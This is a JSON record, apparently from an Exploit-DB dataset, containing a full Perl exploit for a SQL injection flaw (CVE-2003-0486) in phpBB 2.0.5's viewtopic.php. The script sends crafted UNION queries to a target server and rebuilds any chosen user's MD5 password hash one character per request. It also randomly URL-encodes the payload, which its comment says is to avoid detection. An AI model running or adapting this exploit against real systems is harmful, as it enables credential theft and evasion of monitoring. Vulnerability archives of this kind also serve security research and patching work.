{
  "id": "44",
  "title": "phpBB 2.0.5 - SQL Injection Password Disclosure",
  "cve": "CVE-2003-0486",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl -w\r\n#\r\n#\r\n# phpBB password disclosure vuln.\r\n# - rick patel\r\n# \r\n# There is a sql injection vuln which exists in /viewtopic.php file. The variable is $topic_id\r\n# which gets passed directly to sql server in query. Attacker could pass a special sql string which\r\n# can used to see md5 password hash for any user (!) for phpBB. This pass can be later used with\r\n# autologin or cracked using john. \r\n#\r\n# Details: \r\n#\r\n# this is checking done for $topic_id in viewtopic.php:\r\n#\r\n# if ( isset($HTTP_GET_VARS[POST_TOPIC_URL]) )\r\n# {\r\n# $topic_id = intval($HTTP_GET_VARS[POST_TOPIC_URL]);\r\n# }\r\n# else if ( isset($HTTP_GET_VARS['topic']) )\r\n# {\r\n# $topic_id = intval($HTTP_GET_VARS['topic']);\r\n# }\r\n#\r\n# ok... no else statement at end :)\r\n# now if GET[view]=newest and GET[sid] is set, this query gets executed:\r\n#\r\n# $sql = \"SELECT p.post_id\r\n# FROM \" . POSTS_TABLE . \" p, \" . SESSIONS_TABLE . \" s, \" . USERS_TABLE . \" u\r\n# WHERE s.session_id = '$session_id'\r\n# AND u.user_id = s.session_user_id\r\n# AND p.topic_id = $topic_id\r\n# AND p.post_time >= u.user_lastvisit\r\n# ORDER BY p.post_time ASC\r\n# LIMIT 1\";\r\n#\r\n# $topic_id gets passed directy to query. So how can we use this to do something important? Well\r\n# I decided to use union and create a second query will get us something useful. There were couple of \r\n# problems i ran into. first, phpBB only cares about the first row returned. second, the select for first\r\n# query is p.post_id which is int, so int becomes the type returned for any other query in union. third,\r\n# there is rest of junk at end \" AND p.post_time >= ...\" We tell mysql to ignore that by placing /* at end\r\n# of our injected query. So what query can we make that returns only int? \r\n# this one => select ord(substring(user_password,$index,1)) from phpbb_users where user_id = $uid\r\n# Then all we have to do is query 32 times which $index from 1-32 and we get ord value of all chars of\r\n# md5 hash password. \r\n#\r\n# I have only tested this with mysql 4 and pgsql . Mysql 3.x does not support unions so you would have to tweak\r\n# the query to do anything useful. \r\n# \r\n# This script is for educational purpose only. Please dont use it to do anything else. \r\n#\r\n# To Fix this bug : http://www.phpbb.com/phpBB/viewtopic.php?t=112052\r\n\r\nuse IO::Socket;\r\n\r\n$remote = shift || 'localhost';\r\n$view_topic = shift || '/phpBB2/viewtopic.php';\r\n$uid = shift || 2;\r\n$port = 80;\r\n\r\n$dbtype = 'mysql4'; # mysql4 or pgsql \r\n\r\n\r\nprint \"Trying to get password hash for uid $uid server $remote dbtype: $dbtype\\n\";\r\n\r\n$p = \"\";\r\n\r\nfor($index=1; $index<=32; $index++)\r\n{\r\n$socket = IO::Socket::INET->new(PeerAddr => $remote,\r\nPeerPort => $port,\r\nProto => \"tcp\",\r\nType => SOCK_STREAM)\r\nor die \"Couldnt connect to $remote:$port : $@\\n\";\r\n$str = \"GET $view_topic\" . \"?sid=1&topic_id=-1\" . random_encode(make_dbsql()) .\r\n \"&view=newest\" . \" HTTP/1.0\\n\\n\";\r\n\r\nprint $socket $str;\r\nprint $socket \"Cookie: phpBB2mysql_sid=1\\n\"; # replace this for pgsql or remove it\r\nprint $socket \"Host: $remote\\n\\n\";\r\n\r\nwhile ($answer = <$socket>)\r\n{\r\nif ($answer =~ /Location:.*\\x23(\\d+)/) # Matches the Location: viewtopic.php?p=<num>#<num>\r\n{\r\n$p .= chr ($1);\r\n}\r\n}\r\n\r\nclose($socket);\r\n}\r\n\r\nprint \"\\nMD5 Hash for uid $uid is $p\\n\";\r\n\r\n# random encode str. helps avoid detection\r\nsub random_encode\r\n{\r\n$str = shift;\r\n$ret = \"\";\r\nfor($i=0; $i<length($str); $i++)\r\n{\r\n$c = substr($str,$i,1);\r\n$j = rand length($str) * 1000;\r\n\r\nif (int($j) % 2 || $c eq ' ')\r\n{\r\n$ret .= \"%\" . sprintf(\"%x\",ord($c));\r\n}\r\nelse\r\n{\r\n$ret .= $c;\r\n}\r\n}\r\nreturn $ret;\r\n}\r\n\r\nsub make_dbsql\r\n{\r\nif ($dbtype eq 'mysql4')\r\n{\r\nreturn \" union select ord(substring(user_password,\" . $index . \",1)) from phpbb_users where user_id=$uid/*\" ;\r\n} elsif ($dbtype eq 'pgsql')\r\n{\r\nreturn \"; \r\nselect ascii(substring(user_password from $index for 1)) as \r\npost_id from phpbb_posts p, phpbb_users u where u.user_id=$uid or false\";\r\n}\r\nelse \r\n{\r\nreturn \"\";\r\n}\r\n}\r\n\r\n\r\n\r\n# milw0rm.com [2003-06-20]",
  "url": "https://www.exploit-db.com/exploits/44"
}